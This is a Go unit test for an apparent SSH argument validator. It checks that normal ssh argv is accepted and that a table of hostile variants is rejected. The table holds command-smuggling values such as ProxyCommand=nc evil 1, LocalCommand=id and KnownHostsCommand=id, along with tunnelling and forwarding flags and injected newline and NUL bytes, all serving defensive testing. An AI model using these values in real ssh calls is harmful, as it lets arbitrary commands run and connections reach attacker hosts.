package api

import "testing"

func TestCheckSSHArgvRefusesHostileCommands(t *testing.T) {
	ok := []string{"ssh", "-p", "22", "-o", "StrictHostKeyChecking=yes", "-o", "ProxyJump=none", "-l", "root", "--", "10.0.0.5"}
	if err := CheckSSHArgv(ok); err != nil {
		t.Fatalf("normal argv refused: %v", err)
	}
	if err := CheckSSHArgv([]string{"ssh.exe", "-oProxyCommand=none", "--", "h"}); err != nil {
		t.Fatalf("attached form refused: %v", err)
	}
	bad := map[string][]string{
		"empty":           nil,
		"not ssh":         {"/bin/sh", "-c", "id", "--", "h"},
		"ssh lookalike":   {"sshx", "--", "h"},
		"no --":           {"ssh", "-p", "22", "h"},
		"-J":              {"ssh", "-J", "evil", "--", "h"},
		"-Jattached":      {"ssh", "-Jevil", "--", "h"},
		"-W":              {"ssh", "-W", "a:1", "--", "h"},
		"-F":              {"ssh", "-F", "/tmp/c", "--", "h"},
		"-S":              {"ssh", "-S", "/tmp/s", "--", "h"},
		"-M":              {"ssh", "-M", "--", "h"},
		"-R":              {"ssh", "-R", "1:a:1", "--", "h"},
		"-L":              {"ssh", "-L", "1:a:1", "--", "h"},
		"-D":              {"ssh", "-D", "1", "--", "h"},
		"-w":              {"ssh", "-w", "0:0", "--", "h"},
		"-N":              {"ssh", "-N", "--", "h"},
		"-f":              {"ssh", "-f", "--", "h"},
		"cluster":         {"ssh", "-vN", "--", "h"},
		"proxycmd":        {"ssh", "-o", "ProxyCommand=nc evil 1", "--", "h"},
		"proxycmd attach": {"ssh", "-oProxyCommand=nc evil 1", "--", "h"},
		"proxycmd space":  {"ssh", "-o", "proxycommand nc evil 1", "--", "h"},
		"proxyjump":       {"ssh", "-o", "PROXYJUMP=evil", "--", "h"},
		"localcommand":    {"ssh", "-o", "LocalCommand=id", "--", "h"},
		"permitlocal":     {"ssh", "-o", "PermitLocalCommand=yes", "--", "h"},
		"controlpath":     {"ssh", "-oControlPath=/tmp/x", "--", "h"},
		"controlmaster":   {"ssh", "-o", "ControlMaster=auto", "--", "h"},
		"knownhostscmd":   {"ssh", "-o", "KnownHostsCommand=id", "--", "h"},
		"match":           {"ssh", "-o", "Match=all", "--", "h"},
		"include":         {"ssh", "-o", "Include=/tmp/c", "--", "h"},
		"strict no":       {"ssh", "-o", "StrictHostKeyChecking=no", "--", "h"},
		"strict ask":      {"ssh", "-oStrictHostKeyChecking=accept-new", "--", "h"},
		"newline":         {"ssh", "-l", "a\nb", "--", "h"},
		"nul":             {"ssh", "--", "h\x00"},
		"option dest":     {"ssh", "--", "-oProxyCommand=id"},
		"two dest":        {"ssh", "--", "h", "id"},
		"no dest":         {"ssh", "--"},
	}
	for name, argv := range bad {
		if err := CheckSSHArgv(argv); err == nil {
			t.Errorf("%s: %q passed", name, argv)
		}
	}
}
